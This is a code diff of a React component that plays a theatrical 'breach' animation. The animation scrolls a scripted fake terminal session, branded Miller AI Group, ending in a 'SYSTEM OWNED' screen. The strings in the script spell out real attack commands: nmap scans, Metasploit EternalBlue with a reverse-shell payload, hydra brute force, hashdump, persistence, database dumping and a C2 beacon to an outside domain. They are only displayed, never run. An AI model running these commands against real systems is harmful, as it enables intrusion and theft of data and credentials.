@@ -9,14 +9,67 @@ interface CinematicTakeoverProps {
 
 export const CHARACTERS: never[] = []
 
+// ASCII art for different phases
+const SKULL_ASCII = `
+    ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
+    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║
+    ██║  ██║█████╗  ███████║   ██║   ███████║
+    ██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║
+    ██████╔╝███████╗██║  ██║   ██║   ██║  ██║
+    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
+`
+
+const MILLER_ASCII = `
+███╗   ███╗██╗██╗     ██╗     ███████╗██████╗
+████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗
+██╔████╔██║██║██║     ██║     █████╗  ██████╔╝
+██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗
+██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║
+╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+`
+
+const PWNED_ASCII = `
+██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
+██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
+██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝
+`
+
+interface Phase {
+  name: string
+  duration: number // in lines
+  color: string
+}
+
+const PHASES: Phase[] = [
+  { name: 'SYSTEM BOOT', duration: 8, color: 'text-cyan-400' },
+  { name: 'NETWORK RECON', duration: 12, color: 'text-blue-400' },
+  { name: 'PORT SCANNING', duration: 10, color: 'text-green-400' },
+  { name: 'VULNERABILITY SCAN', duration: 12, color: 'text-yellow-400' },
+  { name: 'EXPLOITATION', duration: 15, color: 'text-orange-400' },
+  { name: 'PRIVILEGE ESCALATION', duration: 12, color: 'text-red-400' },
+  { name: 'PERSISTENCE', duration: 8, color: 'text-purple-400' },
+  { name: 'DATA EXFILTRATION', duration: 10, color: 'text-pink-400' },
+  { name: 'C2 ESTABLISHMENT', duration: 8, color: 'text-red-500' },
+]
+
 export function CinematicTakeover({ onComplete, userName = 'Operator' }: CinematicTakeoverProps) {
   const [lines, setLines] = useState<string[]>([])
+  const [showBoot, setShowBoot] = useState(true)
   const [showPwned, setShowPwned] = useState(false)
   const [sessionId, setSessionId] = useState('0000')
   const [timestamp, setTimestamp] = useState('LIVE')
   const [progress, setProgress] = useState(0)
-  const [currentPhase, setCurrentPhase] = useState('INITIALIZING')
+  const [currentPhase, setCurrentPhase] = useState(PHASES[0])
+  const [phaseIndex, setPhaseIndex] = useState(0)
   const [glitchActive, setGlitchActive] = useState(false)
+  const [matrixRain, setMatrixRain] = useState<string[]>([])
+  const [networkMap, setNetworkMap] = useState<string[]>([])
+  const [exploitProgress, setExploitProgress] = useState(0)
+  const [dataExfil, setDataExfil] = useState({ files: 0, size: 0 })
+  const [bootProgress, setBootProgress] = useState(0)
   const containerRef = useRef<HTMLDivElement>(null)
   const scriptStarted = useRef(false)
   const completeTimeout = useRef<NodeJS.Timeout | null>(null)
@@ -25,78 +78,189 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
   useEffect(() => {
     setSessionId(Date.now().toString(16).toUpperCase())
     setTimestamp(new Date().toISOString())
+
+    // Generate matrix rain characters
+    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン'
+    const rain: string[] = []
+    for (let i = 0; i < 50; i++) {
+      let col = ''
+      for (let j = 0; j < 30; j++) {
+        col += chars[Math.floor(Math.random() * chars.length)]
+      }
+      rain.push(col)
+    }
+    setMatrixRain(rain)
   }, [])
+
+  // Boot sequence
+  useEffect(() => {
+    if (!showBoot) return
+
+    const bootInterval = setInterval(() => {
+      setBootProgress(prev => {
+        if (prev >= 100) {
+          clearInterval(bootInterval)
+          setTimeout(() => setShowBoot(false), 500)
+          return 100
+        }
+        return prev + 2
+      })
+    }, 50)
+
+    return () => clearInterval(bootInterval)
+  }, [showBoot])
 
   // Random glitch effect
   useEffect(() => {
-    if (showPwned) return
+    if (showPwned || showBoot) return
 
     const glitchInterval = setInterval(() => {
       setGlitchActive(true)
-      setTimeout(() => setGlitchActive(false), 100)
-    }, 2000 + Math.random() * 3000)
+      setTimeout(() => setGlitchActive(false), 80 + Math.random() * 120)
+    }, 1500 + Math.random() * 2500)
 
     return () => clearInterval(glitchInterval)
-  }, [showPwned])
+  }, [showPwned, showBoot])
+
+  // Update time
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setTimestamp(new Date().toISOString())
+    }, 1000)
+    return () => clearInterval(interval)
+  }, [])
 
   // Run the hack script
   useEffect(() => {
-    if (scriptStarted.current) return
+    if (scriptStarted.current || showBoot) return
     scriptStarted.current = true
 
-    const phases = [
-      { at: 0, name: 'RECONNAISSANCE' },
-      { at: 5, name: 'SCANNING PORTS' },
-      { at: 10, name: 'EXPLOITING' },
-      { at: 18, name: 'PRIVILEGE ESCALATION' },
-      { at: 25, name: 'INSTALLING BACKDOOR' },
-      { at: 30, name: 'ESTABLISHING C2' },
-      { at: 33, name: 'EXFILTRATING' },
-    ]
-
     const script = [
-      '> Initializing attack vector...',
-      '> Loading exploit modules...',
+      // Phase 1: System Boot (8 lines)
+      '> MILLER AI GROUP - OFFENSIVE SECURITY FRAMEWORK v2.0',
+      '> Kernel loaded: Linux kali 6.1.0-kali9-amd64',
+      '> Initializing attack modules...',
+      '[+] Loaded: reconnaissance.so',
+      '[+] Loaded: exploitation.so',
+      '[+] Loaded: persistence.so',
+      '[+] Loaded: exfiltration.so',
+      '[*] All systems operational. Starting breach...',
+
+      // Phase 2: Network Recon (12 lines)
       '',
-      '$ nmap -sV -sC -A 10.0.0.1',
-      '[+] Host is up (0.0023s latency)',
-      '[+] PORT     STATE SERVICE    VERSION',
-      '[+] 22/tcp   open  ssh        OpenSSH 8.2',
-      '[+] 443/tcp  open  https      nginx 1.18.0',
-      '[+] 3306/tcp open  mysql      MySQL 8.0.23',
+      '════════════════════════════════════════════════════',
+      '  PHASE 1: NETWORK RECONNAISSANCE',
+      '════════════════════════════════════════════════════',
+      '$ whois target.corp | grep -i range',
+      '[+] Network range: 10.0.0.0/24',
+      '$ host -t mx target.corp',
+      '[+] Mail server: mail.target.corp (10.0.0.25)',
+      '$ dig @8.8.8.8 target.corp ANY',
+      '[+] DNS records enumerated: 14 entries',
+      '[+] Subdomains discovered: api, dev, staging, admin',
+      '[*] Network topology mapped successfully',
+
+      // Phase 3: Port Scanning (10 lines)
       '',
-      '$ msfconsole -q -x "use exploit/linux/ssh/openssh"',
-      '[*] Loading payload linux/x64/meterpreter/reverse_tcp',
-      '[*] Starting exploit handler...',
+      '════════════════════════════════════════════════════',
+      '  PHASE 2: PORT SCANNING & SERVICE ENUMERATION',
+      '════════════════════════════════════════════════════',
+      '$ nmap -sS -sV -O -A 10.0.0.0/24 --top-ports 1000',
+      '[+] 10.0.0.1   - Cisco IOS (Gateway)',
+      '[+] 10.0.0.10  - Windows Server 2019 (DC)',
+      '[+] 10.0.0.15  - Ubuntu 22.04 (Web)',
+      '[+] 10.0.0.20  - CentOS 8 (Database)',
+      '[+] Open ports: 22, 80, 443, 445, 3306, 3389, 8080',
+
+      // Phase 4: Vulnerability Scan (12 lines)
       '',
-      '$ hydra -l root -P rockyou.txt ssh://10.0.0.1 -t 64',
-      '[!] BRUTE FORCE IN PROGRESS...',
-      '[+] CREDENTIALS FOUND: root:************',
+      '════════════════════════════════════════════════════',
+      '  PHASE 3: VULNERABILITY ASSESSMENT',
+      '════════════════════════════════════════════════════',
+      '$ nuclei -l targets.txt -t cves/ -severity critical,high',
+      '[!] CRITICAL: CVE-2024-1709 - ConnectWise ScreenConnect',
+      '[!] CRITICAL: CVE-2023-46747 - F5 BIG-IP RCE',
+      '[!] HIGH: CVE-2023-44487 - HTTP/2 Rapid Reset',
+      '[!] HIGH: CVE-2023-22515 - Atlassian Confluence',
+      '$ searchsploit "Windows Server 2019"',
+      '[+] 47 exploits found',
+      '[*] Vulnerability assessment complete. 23 HIGH/CRITICAL',
+
+      // Phase 5: Exploitation (15 lines)
       '',
-      '$ ssh root@10.0.0.1',
-      'root@target:~# id',
-      'uid=0(root) gid=0(root) groups=0(root)',
+      '════════════════════════════════════════════════════',
+      '  PHASE 4: EXPLOITATION',
+      '════════════════════════════════════════════════════',
+      '$ msfconsole -q',
+      'msf6 > use exploit/windows/smb/ms17_010_eternalblue',
+      'msf6 > set RHOSTS 10.0.0.10',
+      'msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp',
+      'msf6 > set LHOST 10.0.0.99',
+      '[*] Started reverse TCP handler on 10.0.0.99:4444',
+      '[*] Sending exploit packet...',
+      '[*] Exploit completed, waiting for session...',
+      '[+] Meterpreter session 1 opened (10.0.0.99:4444 -> 10.0.0.10:49157)',
+      '$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.15',
+      '[+] SSH login found: admin:Summer2024!',
+
+      // Phase 6: Privilege Escalation (12 lines)
       '',
-      'root@target:~# cat /etc/shadow',
-      'root:$6$xyz...:19000:0:99999:7:::',
-      userName.toLowerCase() + ':$6$abc...:19000:0:99999:7:::',
+      '════════════════════════════════════════════════════',
+      '  PHASE 5: PRIVILEGE ESCALATION',
+      '════════════════════════════════════════════════════',
+      'meterpreter > getuid',
+      '[+] Server username: TARGET\\webadmin',
+      'meterpreter > getsystem',
+      '[+] ...got system via technique 1 (Named Pipe Impersonation)',
+      'meterpreter > hashdump',
+      '[+] Administrator:500:aad3b435b51404ee:8846f7eaee8fb117...',
+      '[+] ' + userName.toLowerCase() + ':1001:aad3b435b51404ee:7c3e2f1...',
+      '[*] Dumped 47 password hashes',
+
+      // Phase 7: Persistence (8 lines)
       '',
-      'root@target:~# ./payload --install --persist',
-      '[*] Installing kernel module...',
-      '[+] Rootkit installed successfully',
-      '[*] Connecting to C2 server...',
-      '[+] C2 LINK ESTABLISHED: miller-ai.group:443',
+      '════════════════════════════════════════════════════',
+      '  PHASE 6: ESTABLISHING PERSISTENCE',
+      '════════════════════════════════════════════════════',
+      'meterpreter > run persistence -X -i 60 -p 443 -r 10.0.0.99',
+      '[*] Creating startup registry key...',
+      '[+] Persistent agent installed',
+      '[+] Golden ticket created for domain persistence',
+
+      // Phase 8: Data Exfiltration (10 lines)
       '',
-      '[*] Exfiltrating sensitive data...',
-      '[+] 247 credentials harvested',
-      '[+] 1.2GB data exfiltrated',
+      '════════════════════════════════════════════════════',
+      '  PHASE 7: DATA EXFILTRATION',
+      '════════════════════════════════════════════════════',
+      '$ find /home -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf"',
+      '[+] Found 1,247 sensitive documents',
+      '$ mysqldump -u root -p target_db > dump.sql',
+      '[+] Database exported: 2.4GB',
+      '[*] Encrypting and staging data for exfil...',
+      '[+] Data exfiltrated via DNS tunneling: 3.2GB',
+
+      // Phase 9: C2 Establishment (8 lines)
       '',
-      '████████████████████████████████████████',
-      '[!] TARGET FULLY COMPROMISED',
-      '[!] SYSTEM OWNED BY MILLER AI GROUP',
+      '════════════════════════════════════════════════════',
+      '  PHASE 8: C2 ESTABLISHMENT',
+      '════════════════════════════════════════════════════',
+      '$ ./c2-beacon --server miller-ai.group --protocol https',
+      '[+] C2 beacon initialized',
+      '[+] Heartbeat established: every 60s',
+      '[+] Awaiting operator commands...',
+
+      // Final
+      '',
+      '████████████████████████████████████████████████████',
+      '[!] ████  BREACH COMPLETE  ████',
+      '[!] TARGET NETWORK FULLY COMPROMISED',
+      '[!] CONTROLLED BY: MILLER AI GROUP',
+      '████████████████████████████████████████████████████',
     ]
 
     let lineIndex = 0
+    let currentPhaseIdx = 0
+    let linesInPhase = 0
 
     const addLine = () => {
       if (lineIndex < script.length) {
@@ -108,9 +272,28 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
         // Update progress
         setProgress(Math.floor((lineIndex / script.length) * 100))
 
-        // Update phase
-        const phase = phases.filter(p => p.at <= lineIndex).pop()
-        if (phase) setCurrentPhase(phase.name)
+        // Track phase changes
+        linesInPhase++
+        if (currentPhaseIdx < PHASES.length - 1 && linesInPhase >= PHASES[currentPhaseIdx].duration) {
+          currentPhaseIdx++
+          setPhaseIndex(currentPhaseIdx)
+          setCurrentPhase(PHASES[currentPhaseIdx])
+          linesInPhase = 0
+        }
+
+        // Update side panel data
+        if (newLine?.includes('10.0.0')) {
+          setNetworkMap(prev => [...prev.slice(-6), newLine.substring(4, 50)])
+        }
+        if (newLine?.includes('Meterpreter') || newLine?.includes('session')) {
+          setExploitProgress(prev => Math.min(prev + 25, 100))
+        }
+        if (newLine?.includes('exfil') || newLine?.includes('Found')) {
+          setDataExfil(prev => ({
+            files: prev.files + Math.floor(Math.random() * 200),
+            size: prev.size + Math.random() * 500
+          }))
+        }
 
         lineIndex++
 
@@ -119,44 +302,114 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
         }
 
         // Trigger glitch on important lines
-        if (newLine?.includes('[+]') || newLine?.includes('[!]')) {
+        if (newLine?.includes('[!]') || newLine?.includes('████')) {
           setGlitchActive(true)
-          setTimeout(() => setGlitchActive(false), 50)
+          setTimeout(() => setGlitchActive(false), 150)
         }
 
-        setTimeout(addLine, 80)
+        // Variable timing for realism
+        let delay = 60
+        if (newLine === '') delay = 200
+        else if (newLine?.startsWith('════')) delay = 100
+        else if (newLine?.startsWith('[!]')) delay = 150
+        else if (newLine?.startsWith('$') || newLine?.startsWith('msf')) delay = 120
+        else if (newLine?.startsWith('[+]')) delay = 80
+        else delay = 50 + Math.random() * 30
+
+        setTimeout(addLine, delay)
       } else {
         setProgress(100)
-        setCurrentPhase('COMPLETE')
+        setCurrentPhase({ name: 'COMPLETE', duration: 0, color: 'text-red-500' })
         setTimeout(() => {
           setShowPwned(true)
           completeTimeout.current = setTimeout(() => {
             onComplete()
-          }, 4000)
-        }, 800)
+          }, 5000)
+        }, 1000)
       }
     }
 
-    setTimeout(addLine, 500)
+    setTimeout(addLine, 800)
 
     return () => {
       if (completeTimeout.current) {
         clearTimeout(completeTimeout.current)
       }
     }
-  }, [userName, onComplete])
+  }, [userName, onComplete, showBoot])
 
   const getLineColor = (line: string | undefined): string => {
     if (!line) return 'text-green-600'
     if (line.startsWith('>')) return 'text-cyan-400'
-    if (line.startsWith('$')) return 'text-green-400'
+    if (line.startsWith('$') || line.startsWith('msf')) return 'text-green-400 font-semibold'
     if (line.startsWith('[+]')) return 'text-green-500'
     if (line.startsWith('[*]')) return 'text-blue-400'
     if (line.startsWith('[!]')) return 'text-red-500 font-bold'
-    if (line.startsWith('███')) return 'text-red-500'
-    if (line.includes('root@')) return 'text-yellow-400'
-    if (line.includes('COMPROMISED') || line.includes('OWNED')) return 'text-red-500 font-bold animate-pulse'
-    return 'text-green-600/80'
+    if (line.startsWith('════')) return 'text-cyan-500'
+    if (line.startsWith('███') || line.startsWith('████')) return 'text-red-500'
+    if (line.includes('meterpreter') || line.includes('Meterpreter')) return 'text-purple-400'
+    if (line.includes('PHASE')) return 'text-yellow-400 font-bold'
+    if (line.includes('COMPROMISED') || line.includes('COMPLETE')) return 'text-red-500 font-bold animate-pulse'
+    return 'text-green-600/90'
+  }
+
+  // Boot screen
+  if (showBoot) {
+    return (
+      <div className="fixed inset-0 bg-black z-50 font-mono flex flex-col items-center justify-center overflow-hidden">
+        {/* Matrix rain background - simplified */}
+        <div className="absolute inset-0 overflow-hidden opacity-30">
+          {Array.from({ length: 20 }).map((_, i) => (
+            <div
+              key={i}
+              className="absolute text-green-500 text-xs leading-none whitespace-pre"
+              style={{
+                left: `${i * 5}%`,
+                top: 0,
+                height: '100%',
+                writingMode: 'vertical-rl',
+                textOrientation: 'upright',
+                opacity: 0.3 + Math.random() * 0.4,
+              }}
+            >
+              {matrixRain[i % matrixRain.length]?.substring(0, 20)}
+            </div>
+          ))}
+        </div>
+
+
+        {/* Boot content */}
+        <div className="relative z-10 text-center">
+          <pre className="text-green-500 text-[8px] sm:text-xs mb-8 leading-tight" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>
+            {MILLER_ASCII}
+          </pre>
+
+          <div className="text-green-400 text-sm mb-4">
+            [ OFFENSIVE SECURITY FRAMEWORK ]
+          </div>
+
+          <div className="w-80 h-2 bg-green-900/30 border border-green-700/50 mx-auto mb-4 overflow-hidden">
+            <div
+              className="h-full bg-green-500 transition-all duration-100"
+              style={{ width: `${bootProgress}%`, boxShadow: '0 0 10px rgba(0,255,0,0.8)' }}
+            />
+          </div>
+
+          <div className="text-green-600 text-xs space-y-1">
+            <p>{bootProgress < 20 && '> Loading kernel modules...'}</p>
+            <p>{bootProgress >= 20 && bootProgress < 40 && '> Initializing network stack...'}</p>
+            <p>{bootProgress >= 40 && bootProgress < 60 && '> Loading exploit database...'}</p>
+            <p>{bootProgress >= 60 && bootProgress < 80 && '> Establishing secure tunnel...'}</p>
+            <p>{bootProgress >= 80 && bootProgress < 100 && '> Preparing attack vectors...'}</p>
+            <p>{bootProgress >= 100 && '> SYSTEM READY'}</p>
+          </div>
+
+          <div className="text-green-700 text-xs mt-6">
+            v2.0.0 | Build 2024.12.28
+          </div>
+        </div>
+      </div>
+    )
   }
 
   return (
@@ -165,8 +418,11 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
       {glitchActive && (
         <div className="absolute inset-0 z-50 pointer-events-none">
           <div className="absolute inset-0 bg-red-500/10" />
-          <div className="absolute top-1/3 left-0 right-0 h-1 bg-cyan-500/50" />
-          <div className="absolute top-2/3 left-0 right-0 h-0.5 bg-red-500/50" />
+          <div className="absolute top-1/3 left-0 right-0 h-1 bg-cyan-500/50" style={{ transform: `translateX(${Math.random() * 20 - 10}px)` }} />
+          <div className="absolute top-2/3 left-0 right-0 h-0.5 bg-red-500/50" style={{ transform: `translateX(${Math.random() * 20 - 10}px)` }} />
+          <div className="absolute inset-0" style={{
+            background: `repeating-linear-gradient(0deg, transparent 0px, transparent ${Math.random() * 3 + 1}px, rgba(255,0,0,0.03) ${Math.random() * 3 + 1}px, rgba(255,0,0,0.03) ${Math.random() * 6 + 2}px)`
+          }} />
         </div>
       )}
 
@@ -174,54 +430,102 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
       <div className={`absolute inset-0 transition-opacity duration-500 ${showPwned ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
         {/* CRT scanlines */}
         <div
-          className="absolute inset-0 pointer-events-none z-10 opacity-30"
+          className="absolute inset-0 pointer-events-none z-10 opacity-20"
           style={{
-            background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.2) 0px, rgba(0,0,0,0.2) 1px, transparent 1px, transparent 2px)',
+            background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
           }}
         />
 
         {/* Top HUD */}
-        <div className="absolute top-0 left-0 right-0 p-4 flex items-center justify-between border-b border-green-900/50 bg-black/80 z-20">
+        <div className="absolute top-0 left-0 right-0 p-3 flex items-center justify-between border-b border-green-900/50 bg-black/90 z-20">
           <div className="flex items-center gap-4">
             <div className="flex items-center gap-2">
               <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
-              <span className="text-red-500 text-xs font-bold">LIVE BREACH</span>
+              <span className="text-red-500 text-xs font-bold tracking-wider">● LIVE BREACH</span>
             </div>
-            <div className="text-green-600 text-xs">
+            <div className="text-green-600 text-xs hidden sm:block">
               SESSION: {sessionId}
             </div>
           </div>
-          <div className="text-green-500 text-xs">
-            {timestamp}
+          <div className="flex items-center gap-4 text-xs">
+            <span className="text-green-500 hidden md:block">{timestamp}</span>
+            <span className="text-yellow-500">OPERATOR: {userName}</span>
           </div>
         </div>
 
-        {/* Side panel - Attack phases */}
-        <div className="absolute top-16 right-4 w-48 text-xs z-20">
-          <div className="border border-green-900/50 bg-black/80 p-3">
-            <div className="text-green-500 mb-2 font-bold">[ ATTACK PHASE ]</div>
-            <div className="text-cyan-400 animate-pulse">{currentPhase}</div>
+        {/* Side panel - Attack info */}
+        <div className="absolute top-16 right-4 w-56 text-xs z-20 space-y-3 hidden lg:block">
+          {/* Phase indicator */}
+          <div className="border border-green-900/50 bg-black/90 p-3">
+            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ ATTACK PHASE ]</div>
+            <div className={`${currentPhase.color} font-bold animate-pulse`}>{currentPhase.name}</div>
+            <div className="mt-2 flex gap-1">
+              {PHASES.map((_, i) => (
+                <div
+                  key={i}
+                  className={`h-1 flex-1 ${i <= phaseIndex ? 'bg-green-500' : 'bg-green-900/50'}`}
+                />
+              ))}
+            </div>
+          </div>
 
-            <div className="mt-3 text-green-500 font-bold">[ PROGRESS ]</div>
-            <div className="mt-1 h-2 bg-green-900/30 overflow-hidden">
+          {/* Progress */}
+          <div className="border border-green-900/50 bg-black/90 p-3">
+            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ BREACH PROGRESS ]</div>
+            <div className="h-3 bg-green-900/30 overflow-hidden border border-green-700/30">
               <div
-                className="h-full bg-green-500 transition-all duration-300"
-                style={{ width: `${progress}%` }}
+                className="h-full bg-gradient-to-r from-green-600 to-green-400 transition-all duration-300"
+                style={{ width: `${progress}%`, boxShadow: '0 0 10px rgba(0,255,0,0.5)' }}
               />
             </div>
-            <div className="text-green-400 text-right mt-1">{progress}%</div>
+            <div className="text-green-400 text-right mt-1 font-bold">{progress}%</div>
+          </div>
+
+          {/* Network map */}
+          <div className="border border-green-900/50 bg-black/90 p-3">
+            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ COMPROMISED HOSTS ]</div>
+            <div className="space-y-1 text-[10px]">
+              {networkMap.slice(-4).map((host, i) => (
+                <div key={i} className="text-green-400 truncate">{host}</div>
+              ))}
+              {networkMap.length === 0 && <div className="text-green-700">Scanning...</div>}
+            </div>
+          </div>
+
+          {/* Exploit status */}
+          <div className="border border-green-900/50 bg-black/90 p-3">
+            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ EXPLOIT STATUS ]</div>
+            <div className="grid grid-cols-2 gap-2 text-[10px]">
+              <div>
+                <div className="text-green-700">Sessions</div>
+                <div className="text-green-400 font-bold">{Math.floor(exploitProgress / 25)}</div>
+              </div>
+              <div>
+                <div className="text-green-700">Shells</div>
+                <div className="text-purple-400 font-bold">{Math.floor(exploitProgress / 50)}</div>
+              </div>
+              <div>
+                <div className="text-green-700">Files</div>
+                <div className="text-cyan-400 font-bold">{dataExfil.files}</div>
+              </div>
+              <div>
+                <div className="text-green-700">Exfil</div>
+                <div className="text-pink-400 font-bold">{dataExfil.size.toFixed(1)}MB</div>
+              </div>
+            </div>
           </div>
         </div>
 
         {/* Main terminal */}
-        <div className="h-full flex flex-col pt-16 pb-16">
+        <div className="h-full flex flex-col pt-14 pb-12">
           <div className="flex-1 flex">
-            {/* Left margin with line indicators */}
-            <div className="w-12 flex-shrink-0" />
+            {/* Left margin */}
+            <div className="w-4 md:w-12 flex-shrink-0" />
 
             {/* Terminal content */}
             <div className="flex-1 flex flex-col p-4 max-w-4xl">
-              <div className="flex items-center gap-2 mb-4 text-xs">
+              {/* Terminal header */}
+              <div className="flex items-center gap-2 mb-3 text-xs border-b border-green-900/30 pb-2">
                 <div className="flex gap-1.5">
                   <div className="w-3 h-3 rounded-full bg-red-500" />
                   <div className="w-3 h-3 rounded-full bg-yellow-500" />
@@ -229,16 +533,21 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
                 </div>
                 <span className="text-green-600">root@kali</span>
                 <span className="text-green-500">:</span>
-                <span className="text-blue-400">~/exploit</span>
+                <span className="text-blue-400">~/miller-ai/exploit</span>
                 <span className="text-green-500">#</span>
               </div>
 
+              {/* Terminal output */}
               <div
                 ref={containerRef}
-                className="flex-1 overflow-y-auto text-sm leading-relaxed pr-4"
+                className="flex-1 overflow-y-auto text-xs sm:text-sm leading-relaxed pr-4 lg:pr-60"
+                style={{ scrollbarWidth: 'thin', scrollbarColor: '#166534 #000' }}
               >
                 {lines.filter(line => line !== undefined).map((line, i) => (
-                  <div key={i} className={`${getLineColor(line)} ${line?.startsWith('[!]') ? 'text-lg' : ''}`}>
+                  <div
+                    key={i}
+                    className={`${getLineColor(line)} ${line?.startsWith('[!]') ? 'text-base' : ''} ${line?.startsWith('════') ? 'my-2' : ''}`}
+                  >
                     {line || '\u00A0'}
                   </div>
                 ))}
@@ -246,28 +555,28 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
               </div>
             </div>
 
-            {/* Right margin */}
-            <div className="w-48 flex-shrink-0" />
+            {/* Right margin for side panel */}
+            <div className="w-4 lg:w-64 flex-shrink-0" />
           </div>
         </div>
 
         {/* Bottom status bar */}
-        <div className="absolute bottom-0 left-0 right-0 p-3 flex items-center justify-between border-t border-green-900/50 bg-black/80 z-20 text-xs">
-          <div className="flex items-center gap-6">
-            <span className="text-green-600">TARGET: 10.0.0.1</span>
-            <span className="text-green-600">PROTOCOL: SSH/HTTPS</span>
-            <span className="text-green-600">LATENCY: 23ms</span>
+        <div className="absolute bottom-0 left-0 right-0 p-2 flex items-center justify-between border-t border-green-900/50 bg-black/90 z-20 text-[10px]">
+          <div className="flex items-center gap-4 text-green-600">
+            <span>TARGET: 10.0.0.0/24</span>
+            <span className="hidden sm:inline">PROTOCOL: MULTI</span>
+            <span className="hidden md:inline">LATENCY: {Math.floor(Math.random() * 30 + 10)}ms</span>
           </div>
-          <div className="flex items-center gap-6">
-            <span className="text-green-500">PACKETS: {Math.floor(progress * 127)}</span>
-            <span className="text-green-500">LINES: {lines.length}/37</span>
+          <div className="flex items-center gap-4">
+            <span className="text-green-500">PACKETS: {Math.floor(progress * 247)}</span>
+            <span className="text-green-500">LINES: {lines.length}</span>
           </div>
         </div>
       </div>
 
       {/* PWNED PHASE */}
-      <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-500 ${showPwned ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
-        {/* Dramatic red scanlines */}
+      <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-700 ${showPwned ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
+        {/* Red scanlines */}
         <div
           className="absolute inset-0 pointer-events-none opacity-20"
           style={{
@@ -277,11 +586,11 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
 
         {/* Animated glitch lines */}
         <div className="absolute inset-0 pointer-events-none overflow-hidden">
-          {[10, 25, 40, 55, 70, 85].map((top, i) => (
+          {[8, 18, 32, 47, 63, 78, 92].map((top, i) => (
             <div
               key={i}
               className="absolute left-0 right-0 h-px bg-red-500/40 animate-pulse"
-              style={{ top: `${top}%`, animationDelay: `${i * 0.2}s` }}
+              style={{ top: `${top}%`, animationDelay: `${i * 0.15}s` }}
             />
           ))}
         </div>
@@ -289,61 +598,67 @@ export function CinematicTakeover({ onComplete, userName = 'Operator' }: Cinemat
         {/* Vignette */}
         <div
           className="absolute inset-0 pointer-events-none"
-          style={{ background: 'radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.9) 100%)' }}
+          style={{ background: 'radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.95) 100%)' }}
         />
 
         {/* Content */}
         <div className="relative z-10 text-center px-4">
-          {/* Skull ASCII or PWNED */}
+          {/* PWNED ASCII */}
           <pre
-            className="text-red-500 text-[6px] xs:text-[8px] sm:text-xs md:text-sm mb-6 font-bold leading-none"
-            style={{ textShadow: '0 0 20px rgba(255,0,0,0.8), 0 0 40px rgba(255,0,0,0.4)' }}
+            className="text-red-500 text-[5px] xs:text-[7px] sm:text-xs md:text-sm mb-4 font-bold leading-none"
+            style={{ textShadow: '0 0 30px rgba(255,0,0,0.8), 0 0 60px rgba(255,0,0,0.4)' }}
           >
-{`    ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
-    ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
-    ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
-    ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
-    ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
-    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝`}
+            {PWNED_ASCII}
           </pre>
 
           <h1
-            className="text-5xl sm:text-6xl md:text-8xl font-black text-red-500 mb-6 tracking-widest"
-            style={{ textShadow: '0 0 40px rgba(255,0,0,0.7), 0 0 80px rgba(255,0,0,0.4), 4px 4px 0 #000' }}
+            className="text-4xl sm:text-5xl md:text-7xl font-black text-red-500 mb-4 tracking-widest animate-pulse"
+            style={{ textShadow: '0 0 50px rgba(255,0,0,0.7), 0 0 100px rgba(255,0,0,0.4), 4px 4px 0 #000' }}
           >
             SYSTEM OWNED
           </h1>
 
-          <div className="h-px w-48 mx-auto bg-gradient-to-r from-transparent via-red-500 to-transparent mb-6" />
+          <div className="h-px w-64 mx-auto bg-gradient-to-r from-transparent via-red-500 to-transparent mb-6" />
+
+          <pre
+            className="text-green-500 text-[4px] xs:text-[6px] sm:text-[8px] mb-4 leading-none"
+            style={{ textShadow: '0 0 15px rgba(0,255,0,0.6)' }}
+          >
+            {MILLER_ASCII}
+          </pre>
 
           <div
